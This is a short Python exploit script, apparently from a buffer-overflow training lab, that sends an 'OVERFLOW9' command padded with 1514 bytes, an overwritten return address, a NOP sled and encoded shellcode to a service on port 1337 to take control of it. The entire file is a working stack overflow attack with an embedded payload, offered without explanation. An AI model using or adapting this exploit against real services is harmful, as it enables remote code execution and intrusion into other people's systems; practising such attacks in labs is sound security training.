#!/usr/bin/env python3
import socket

ip = "10.10.33.214"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
#625011AF
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xba\xb5\x85\x05\xfa\xda\xc6\xd9\x74\x24\xf4\x58\x31\xc9"
"\xb1\x52\x31\x50\x12\x03\x50\x12\x83\x5d\x79\xe7\x0f\x61"
"\x6a\x6a\xef\x99\x6b\x0b\x79\x7c\x5a\x0b\x1d\xf5\xcd\xbb"
"\x55\x5b\xe2\x30\x3b\x4f\x71\x34\x94\x60\x32\xf3\xc2\x4f"
"\xc3\xa8\x37\xce\x47\xb3\x6b\x30\x79\x7c\x7e\x31\xbe\x61"
"\x73\x63\x17\xed\x26\x93\x1c\xbb\xfa\x18\x6e\x2d\x7b\xfd"
"\x27\x4c\xaa\x50\x33\x17\x6c\x53\x90\x23\x25\x4b\xf5\x0e"
"\xff\xe0\xcd\xe5\xfe\x20\x1c\x05\xac\x0d\x90\xf4\xac\x4a"
"\x17\xe7\xda\xa2\x6b\x9a\xdc\x71\x11\x40\x68\x61\xb1\x03"
"\xca\x4d\x43\xc7\x8d\x06\x4f\xac\xda\x40\x4c\x33\x0e\xfb"
"\x68\xb8\xb1\x2b\xf9\xfa\x95\xef\xa1\x59\xb7\xb6\x0f\x0f"
"\xc8\xa8\xef\xf0\x6c\xa3\x02\xe4\x1c\xee\x4a\xc9\x2c\x10"
"\x8b\x45\x26\x63\xb9\xca\x9c\xeb\xf1\x83\x3a\xec\xf6\xb9"
"\xfb\x62\x09\x42\xfc\xab\xce\x16\xac\xc3\xe7\x16\x27\x13"
"\x07\xc3\xe8\x43\xa7\xbc\x48\x33\x07\x6d\x21\x59\x88\x52"
"\x51\x62\x42\xfb\xf8\x99\x05\x0e\xf0\xb5\x42\x66\x08\xb5"
"\x7d\x2b\x85\x53\x17\xc3\xc3\xcc\x80\x7a\x4e\x86\x31\x82"
"\x44\xe3\x72\x08\x6b\x14\x3c\xf9\x06\x06\xa9\x09\x5d\x74"
"\x7c\x15\x4b\x10\xe2\x84\x10\xe0\x6d\xb5\x8e\xb7\x3a\x0b"
"\xc7\x5d\xd7\x32\x71\x43\x2a\xa2\xba\xc7\xf1\x17\x44\xc6"
"\x74\x23\x62\xd8\x40\xac\x2e\x8c\x1c\xfb\xf8\x7a\xdb\x55"
"\x4b\xd4\xb5\x0a\x05\xb0\x40\x61\x96\xc6\x4c\xac\x60\x26"
"\xfc\x19\x35\x59\x31\xce\xb1\x22\x2f\x6e\x3d\xf9\xeb\x9e"
"\x74\xa3\x5a\x37\xd1\x36\xdf\x5a\xe2\xed\x1c\x63\x61\x07"
"\xdd\x90\x79\x62\xd8\xdd\x3d\x9f\x90\x4e\xa8\x9f\x07\x6e"
"\xf9")
postfix = ""


buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip,port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")

